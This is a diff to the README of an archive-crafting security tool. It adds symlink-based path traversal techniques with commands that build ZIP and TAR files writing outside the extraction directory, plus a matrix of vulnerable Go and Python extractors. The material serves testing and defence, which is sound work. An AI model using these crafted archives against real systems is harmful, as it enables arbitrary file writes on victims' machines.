@@ -281,6 +281,22 @@ Write through a symlink by adding it first, then a regular file with the same na
 ./archive-alchemist.py collision.tar add config --content "written through symlink"
 ```
 
+### Symlink-to-parent escape (no `../` in filenames)
+
+A two-entry attack where no individual filename contains path traversal sequences, yet the combination achieves arbitrary file write outside the extraction directory:
+
+```bash
+# ZIP variant — entry 1 is a symlink to the filesystem root, entry 2 writes through it
+./archive-alchemist.py escape.zip add escape --symlink "../../../../../../"
+./archive-alchemist.py escape.zip add escape/tmp/evil.txt --content "ESCAPED"
+
+# TAR variant — symlink a directory name to an absolute path
+./archive-alchemist.py escape.tar add subdir --symlink "/tmp"
+./archive-alchemist.py escape.tar add subdir/evil.txt --content "ESCAPED"
+```
+
+This bypasses validators that only scan filenames for `../` or absolute paths — the filenames `escape` and `escape/tmp/evil.txt` both look benign. See [Extractor Vulnerability Matrix](#extractor-vulnerability-matrix) for which libraries are affected.
+
 ### Setuid binary
 
 ```bash
@@ -301,6 +317,31 @@ The local file header says `safe.txt`, but the Unicode Path extra field says `..
 ./archive-alchemist.py polyglot.gif add payload.txt --content "data"
 ./archive-alchemist.py polyglot.gif polyglot --content "GIF89a"
 ```
+
+## Extractor Vulnerability Matrix
+
+Results from testing crafted archives against real extraction libraries in Docker containers. See `research/` for reproduction scripts.
+
+| Attack | Go `archive/zip` | Go `archive/tar` | Python `tarfile` (default) | Python `tarfile` (`filter='data'`) | GNU tar 1.34 | Node.js `tar` |
+|--------|:-:|:-:|:-:|:-:|:-:|:-:|
+| Symlink-to-parent escape | **VULN** | **VULN** | **VULN** | Safe | Safe | Safe |
+| Symlink + duplicate name write-through | — | **VULN** | **VULN** | — | Safe | — |
+| Symlink chain (dir→absolute + nested file) | **VULN** | **VULN** | **VULN** | Safe | Safe | Safe |
+
+**Key findings:**
+
+- **Go `archive/zip` and `archive/tar`** (tested 1.22) have **zero built-in protection** against symlink-based path traversal. The standard `filepath.Join` + `os.Create` extraction pattern follows symlinks, allowing writes outside the output directory.
+- **Python `tarfile`** on Python ≤3.13 defaults to the legacy permissive extraction mode. A deprecation warning is emitted, but symlink attacks succeed unless the caller explicitly passes `filter='data'` or `filter='tar'`. Python 3.14 will change the default.
+- **GNU tar** and **Node.js `tar`** both block these attacks by default.
+
+### Why the symlink-to-parent escape matters
+
+Unlike classic Zip Slip (`../../../etc/cron.d/evil`), the symlink-to-parent attack uses **filenames that pass typical path traversal validation**:
+
+1. Entry `escape` — no `../`, no absolute path, just a short name
+2. Entry `escape/tmp/evil.txt` — a normal-looking nested path
+
+The traversal happens at the filesystem level: the symlink turns the directory name into a junction, and the second entry follows it. Validators that only inspect filenames will miss it entirely.
 
 ## Advanced Techniques
 
@@ -337,6 +378,56 @@ ZIP files have two layers: Local File Headers (LFH) scattered through the file, 
 # Full header dump showing orphaned entries
 ./archive-alchemist.py suspicious.zip --find-orphaned list -ll
 ```
+
+### Symlink-to-Parent Directory Escape
+
+A two-entry attack that achieves path traversal without `../` in any filename. Works against Go's `archive/zip`, Go's `archive/tar`, and Python's `tarfile` (default mode). No individual entry looks malicious — the attack only materializes when both entries are extracted in order.
+
+**ZIP variant** — symlink to filesystem root, then write through it:
+
+```bash
+# Entry 1: symlink "escape" points to root via relative traversal
+./archive-alchemist.py escape.zip add escape --symlink "../../../../../../"
+
+# Entry 2: regular file whose path traverses through the symlink
+./archive-alchemist.py escape.zip add escape/tmp/evil.txt --content "arbitrary write"
+
+# A vulnerable Go extractor creates the symlink, then resolves
+# "escape/tmp/evil.txt" → "../../../../../../tmp/evil.txt" → /tmp/evil.txt
+```
+
+**TAR variant** — symlink a directory name to an absolute path:
+
+```bash
+# Entry 1: symlink "subdir" → "/tmp"
+./archive-alchemist.py escape.tar add subdir --symlink "/tmp"
+
+# Entry 2: file "subdir/evil.txt" — follows symlink to /tmp/evil.txt
+./archive-alchemist.py escape.tar add subdir/evil.txt --content "arbitrary write"
+```
+
+**Why it bypasses validators:**
+- `escape` — not a traversal path, just a name
+- `escape/tmp/evil.txt` — a normal nested path with no `../`
+- The traversal happens at the filesystem layer, invisible to filename-only checks
+
+Test with `extract --vulnerable` to verify, or directly against target extractors in Docker (see `research/scripts/`).
+
+### Symlink + Duplicate Name Write-Through
+
+Combine symlinks with duplicate filenames: the first entry creates a symlink to a target file, the second entry has the same name but is a regular file. Extractors that process in order will write the content through the symlink to the target location:
+
+```bash
+# TAR — write "PAYLOAD" to /tmp/target.txt via symlink collision
+./archive-alchemist.py writethrough.tar add config --symlink "/tmp/target.txt"
+./archive-alchemist.py writethrough.tar add config --content "PAYLOAD"
+
+# Vulnerable extractors (Go archive/tar, Python tarfile default):
+# 1. Create symlink: config → /tmp/target.txt
+# 2. Open "config" for writing → follows symlink → writes to /tmp/target.txt
+```
+
+This also works in ZIP with a symlink entry followed by a regular file entry sharing the same name. The result depends on whether the extractor unlinks before replacing or opens the existing path.
 
 ### Absolute Path Write
 
